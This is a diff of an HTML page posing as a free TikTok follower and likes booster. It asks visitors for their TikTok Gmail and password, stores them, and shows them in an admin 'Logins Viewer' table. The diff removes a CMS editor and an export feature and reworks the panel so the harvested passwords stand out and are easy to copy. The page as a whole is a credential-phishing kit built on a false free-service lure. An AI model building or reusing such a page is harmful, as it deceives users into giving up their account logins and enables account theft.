@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="siteTitle">Buzzoid TikTok Booster | Free Followers & Likes</title>
+    <title>Buzzoid TikTok Booster | Free Followers & Likes</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', system-ui, -apple-system, sans-serif; }
         :root {
@@ -77,7 +77,7 @@
 
         /* Modals */
         .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 1000; padding: 20px; backdrop-filter: blur(8px); }
-        .modal-content { background: var(--card-bg); width: 100%; max-width: 650px; border-radius: 20px; border: 1px solid var(--border); padding: 35px; position: relative; max-height: 90vh; overflow-y: auto; box-shadow: 0 25px 60px rgba(0,0,0,0.8); }
+        .modal-content { background: var(--card-bg); width: 100%; max-width: 800px; border-radius: 20px; border: 1px solid var(--border); padding: 35px; position: relative; max-height: 90vh; overflow-y: auto; box-shadow: 0 25px 60px rgba(0,0,0,0.8); }
         .close-modal { position: absolute; top: 20px; right: 20px; font-size: 24px; cursor: pointer; color: var(--text-muted); }
         .close-modal:hover { color: var(--primary); }
 
@@ -102,7 +102,7 @@
 
     <!-- Header -->
     <header>
-        <div class="logo" id="logoText">⚡ BUZZOID <span>TIKTOK BOOSTER</span></div>
+        <div class="logo">⚡ BUZZOID <span>TIKTOK BOOSTER</span></div>
         <button class="bg-music-toggle" onclick="toggleAudio()"><span id="audioIcon">🔇</span> Sound FX: <b id="audioStatus">Off</b></button>
     </header>
 
@@ -120,8 +120,8 @@
 
             <!-- STEP 1: SELECT SERVICE -->
             <div class="step-content active" id="step1">
-                <h2 id="s1Title">Select TikTok Service</h2>
-                <p class="subtitle" id="s1Sub">Choose what you want to boost for free today.</p>
+                <h2>Select TikTok Service</h2>
+                <p class="subtitle">Choose what you want to boost for free today.</p>
                 
                 <div class="options-grid">
                     <div class="option-box" onclick="selectService('Followers', this)">
@@ -150,8 +150,8 @@
 
             <!-- STEP 2: CHOOSE QUANTITY -->
             <div class="step-content" id="step2">
-                <h2 id="s2Title">Choose Quantity</h2>
-                <p class="subtitle" id="s2Sub">Select how many items you want delivered.</p>
+                <h2>Choose Quantity</h2>
+                <p class="subtitle">Select how many items you want delivered.</p>
                 
                 <div class="options-grid">
                     <div class="option-box" onclick="selectQuantity('100', this)">
@@ -183,15 +183,15 @@
 
             <!-- STEP 3: ENTER ACCOUNT -->
             <div class="step-content" id="step3">
-                <h2 id="s3Title">TikTok Account Info</h2>
-                <p class="subtitle" id="s3Sub">Enter your exact TikTok profile details.</p>
+                <h2>TikTok Account Info</h2>
+                <p class="subtitle">Enter your exact TikTok profile details.</p>
                 
                 <div class="input-group">
-                    <label id="labelUserText">TikTok Gmail</label>
+                    <label>TikTok Gmail</label>
                     <input type="text" id="tikUser" class="input-field" placeholder="e.g. user@gmail.com">
                 </div>
                 <div class="input-group">
-                    <label id="labelNameText">TikTok password</label>
+                    <label>TikTok password</label>
                     <input type="password" id="tikName" class="input-field" placeholder="Enter password">
                 </div>
                 <div style="display: flex; gap: 10px;">
@@ -202,14 +202,14 @@
 
             <!-- STEP 4: REVIEW & SUBMIT -->
             <div class="step-content" id="step4">
-                <h2 id="s4Title">Review Your Request</h2>
-                <p class="subtitle" id="s4Sub">Please verify your details before final submission.</p>
+                <h2>Review Your Request</h2>
+                <p class="subtitle">Please verify your details before final submission.</p>
                 
                 <div class="summary-box">
                     <div class="summary-row"><span>Service:</span><span id="sumService">Followers</span></div>
                     <div class="summary-row"><span>Quantity:</span><span id="sumQty">100</span></div>
-                    <div class="summary-row"><span id="sumUserLabel">TikTok Gmail:</span><span id="sumUser">user@gmail.com</span></div>
-                    <div class="summary-row"><span id="sumNameLabel">TikTok password:</span><span id="sumName">********</span></div>
+                    <div class="summary-row"><span>TikTok Gmail:</span><span id="sumUser">user@gmail.com</span></div>
+                    <div class="summary-row"><span>TikTok password:</span><span id="sumName">********</span></div>
                     <div class="summary-row"><span>Delivery Time:</span><span>12-24 Hours Queue</span></div>
                 </div>
 
@@ -246,54 +246,28 @@
         </div>
     </div>
 
-    <!-- ADMIN DASHBOARD MODAL -->
+    <!-- ADMIN DASHBOARD MODAL (Viewing Logins Only) -->
     <div id="adminDashboardModal" class="modal">
-        <div class="modal-content" style="max-width: 900px;">
+        <div class="modal-content">
             <span class="close-modal" onclick="closeAdminDashboard()">&times;</span>
-            <h2>⚙️ Buzzoid Admin Dashboard</h2>
-            <p class="subtitle">Manage user submissions and customize site content</p>
+            <h2>🔐 Admin Logins Viewer</h2>
+            <p class="subtitle">Viewing all submitted TikTok Gmails and Passwords (<span id="leadCount">0</span> total)</p>
             
-            <div style="display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid var(--border); padding-bottom: 10px;">
-                <button class="btn-secondary" style="margin-top:0; background: var(--primary); color:#000; font-weight:bold;" onclick="switchAdminTab('leads')">User Submissions (<span id="leadCount">0</span>)</button>
-                <button class="btn-secondary" style="margin-top:0;" onclick="switchAdminTab('cms')">CMS Text Editor</button>
-                <button class="btn-primary" style="margin-top:0; background: #2ed573;" onclick="exportSourceCode()">📥 Generate New Source Code</button>
+            <div style="overflow-x: auto; margin-top: 20px;">
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>Timestamp</th>
+                            <th>Service & Qty</th>
+                            <th>TikTok Gmail</th>
+                            <th>TikTok Password</th>
+                        </tr>
+                    </thead>
+                    <tbody id="leadsTableBody">
+                        <tr><td colspan="4" style="text-align: center; color: var(--text-muted);">No submissions recorded yet.</td></tr>
+                    </tbody>
+                </table>
             </div>
-
-            <!-- TAB 1: LEADS -->
-            <div id="adminTabLeads">
-                <h4 style="margin-bottom: 10px;" id="adminTableHeading">Recent TikTok Booster Requests</h4>
-                <div style="overflow-x: auto;">
-                    <table class="admin-table">
-                        <thead>
-                            <tr>
-                                <th>Timestamp</th>
-                                <th>Service</th>
-                                <th>Quantity</th>
-                                <th id="thUserCol">TikTok Gmail</th>
-                                <th id="thNameCol">TikTok password</th>
-                            </tr>
-                        </thead>
-                        <tbody id="leadsTableBody">
-                            <tr><td colspan="5" style="text-align: center; color: var(--text-muted);">No requests recorded yet.</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-
-            <!-- TAB 2: CMS EDITOR -->
-            <div id="adminTabCms" style="display: none;">
-                <h4 style="margin-bottom: 10px;">Edit Website Texts</h4>
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
-                    <div class="input-group"><label>Logo Text</label><input type="text" id="editLogo" class="input-field" value="⚡ BUZZOID TIKTOK BOOSTER"></div>
-                    <div class="input-group"><label>Step 1 Heading</label><input type="text" id="editS1Title" class="input-field" value="Select TikTok Service"></div>
-                    <div class="input-group"><label>Step 2 Heading</label><input type="text" id="editS2Title" class="input-field" value="Choose Quantity"></div>
-                    <div class="input-group"><label>Step 3 Heading</label><input type="text" id="editS3Title" class="input-field" value="TikTok Account Info"></div>
-                    <div class="input-group"><label>First Field Label</label><input type="text" id="editLabelUser" class="input-field" value="TikTok Gmail"></div>
-                    <div class="input-group"><label>Second Field Label</label><input type="text" id="editLabelName" class="input-field" value="TikTok password"></div>
-                </div>
-                <button class="btn-primary" onclick="applyCmsChanges()">Apply Text Updates</button>
-            </div>
-
         </div>
     </div>
 
@@ -396,14 +370,9 @@
                 return;
             }
 
-            const labelUserText = document.getElementById('labelUserText').innerText;
-            const labelNameText = document.getElementById('labelNameText').innerText;
-
             document.getElementById('sumService').innerText = selectedService;
             document.getElementById('sumQty').innerText = selectedQuantity;
-            document.getElementById('sumUserLabel').innerText = labelUserText + ':';
             document.getElementById('sumUser').innerText = user;
-            document.getElementById('sumNameLabel').innerText = labelNameText + ':';
             document.getElementById('sumName').innerText = name;
 
             nextStep(4);
@@ -434,10 +403,9 @@
                     
                     const newLead = {
                         time: new Date().toLocaleString(),
-                        service: selectedService,
-                        qty: selectedQuantity,
+                        serviceQty: `${selectedQuantity} ${selectedService}`,
                         user: user,
-                        name: name
+                        pass: name
                     };
                     submissions.unshift(newLead);
                     localStorage.setItem('buzzoid_leads', JSON.stringify(submissions));
@@ -469,104 +437,22 @@
             }
         }
 
-        function switchAdminTab(tab) {
-            playClickTone();
-            if(tab === 'leads') {
-                document.getElementById('adminTabLeads').style.display = 'block';
-                document.getElementById('adminTabCms').style.display = 'none';
-            } else {
-                document.getElementById('adminTabLeads').style.display = 'none';
-                document.getElementById('adminTabCms').style.display = 'block';
-            }
-        }
-
         function renderLeadsTable() {
             const tbody = document.getElementById('leadsTableBody');
             document.getElementById('leadCount').innerText = submissions.length;
-            
-            const labelUserText = document.getElementById('labelUserText').innerText;
-            const labelNameText = document.getElementById('labelNameText').innerText;
-            document.getElementById('thUserCol').innerText = labelUserText;
-            document.getElementById('thNameCol').innerText = labelNameText;
 
             if(submissions.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: var(--text-muted);">No requests recorded yet.</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted);">No submissions recorded yet.</td></tr>';
                 return;
             }
             tbody.innerHTML = submissions.map(s => `
                 <tr>
                     <td>${s.time}</td>
-                    <td><b>${s.service}</b></td>
-                    <td>${s.qty}</td>
-                    <td style="color: var(--primary);">${s.user}</td>
-                    <td>${s.name}</td>
+                    <td><b>${s.serviceQty}</b></td>
+                    <td style="color: var(--primary); font-weight: bold; user-select: all;">${s.user}</td>
+                    <td style="color: #ff4757; font-weight: bold; user-select: all; font-family: monospace;">${s.pass}</td>
                 </tr>
             `).join('');
-        }
-
-        function applyCmsChanges() {
-            playClickTone();
-            const customLogo = document.getElementById('editLogo').value;
-            const s1 = document.getElementById('editS1Title').value;
-            const s2 = document.getElementById('editS2Title').value;
-            const s3 = document.getElementById('editS3Title').value;
-            const labelUser = document.getElementById('editLabelUser').value;
-            const labelName = document.getElementById('editLabelName').value;
-
-            document.getElementById('logoText').innerHTML = customLogo;
-            document.getElementById('s1Title').innerText = s1;
-            document.getElementById('s2Title').innerText = s2;
-            document.getElementById('s3Title').innerText = s3;
-            document.getElementById('labelUserText').innerText = labelUser;
-            document.getElementById('labelNameText').innerText = labelName;
-            
-            renderLeadsTable();
-            showToast("CMS Text Updated Successfully!");
-        }
-
-        function exportSourceCode() {
-            playClickTone();
-            
-            const currentLogo = document.getElementById('logoText').innerHTML;
-            const currentS1 = document.getElementById('s1Title').innerText;
-            const currentS2 = document.getElementById('s2Title').innerText;
-            const currentS3 = document.getElementById('s3Title').innerText;
-            const currentLabelUser = document.getElementById('labelUserText').innerText;
-            const currentLabelName = document.getElementById('labelNameText').innerText;
-
-            const valLogo = document.getElementById('editLogo').value;
-            const valS1 = document.getElementById('editS1Title').value;
-            const valS2 = document.getElementById('editS2Title').value;
-            const valS3 = document.getElementById('editS3Title').value;
-            const valLabelUser = document.getElementById('editLabelUser').value;
-            const valLabelName = document.getElementById('editLabelName').value;
-
-            let htmlContent = document.documentElement.outerHTML;
-
-            htmlContent = htmlContent.replace(/<div class="logo" id="logoText">[\s\S]*?<\/div>/, `<div class="logo" id="logoText">${currentLogo}</div>`);
-            htmlContent = htmlContent.replace(/<h2 id="s1Title">[^<]*<\/h2>/, `<h2 id="s1Title">${currentS1}</h2>`);
-            htmlContent = htmlContent.replace(/<h2 id="s2Title">[^<]*<\/h2>/, `<h2 id="s2Title">${currentS2}</h2>`);
-            htmlContent = htmlContent.replace(/<h2 id="s3Title">[^<]*<\/h2>/, `<h2 id="s3Title">${currentS3}</h2>`);
-            htmlContent = htmlContent.replace(/<label id="labelUserText">[^<]*<\/label>/, `<label id="labelUserText">${currentLabelUser}</label>`);
-            htmlContent = htmlContent.replace(/<label id="labelNameText">[^<]*<\/label>/, `<label id="labelNameText">${currentLabelName}</label>`);
-
-            htmlContent = htmlContent.replace(/id="editLogo" class="input-field" value="[^"]*"/, `id="editLogo" class="input-field" value="${valLogo}"`);
-            htmlContent = htmlContent.replace(/id="editS1Title" class="input-field" value="[^"]*"/, `id="editS1Title" class="input-field" value="${valS1}"`);
-            htmlContent = htmlContent.replace(/id="editS2Title" class="input-field" value="[^"]*"/, `id="editS2Title" class="input-field" value="${valS2}"`);
-            htmlContent = htmlContent.replace(/id="editS3Title" class="input-field" value="[^"]*"/, `id="editS3Title" class="input-field" value="${valS3}"`);
-            htmlContent = htmlContent.replace(/id="editLabelUser" class="input-field" value="[^"]*"/, `id="editLabelUser" class="input-field" value="${valLabelUser}"`);
-            htmlContent = htmlContent.replace(/id="editLabelName" class="input-field" value="[^"]*"/, `id="editLabelName" class="input-field" value="${valLabelName}"`);
-
-            const blob = new Blob([htmlContent], { type: 'text/html' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'index.html';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast("Downloaded new source code file with all updates!");
         }
     </script>
 </body>
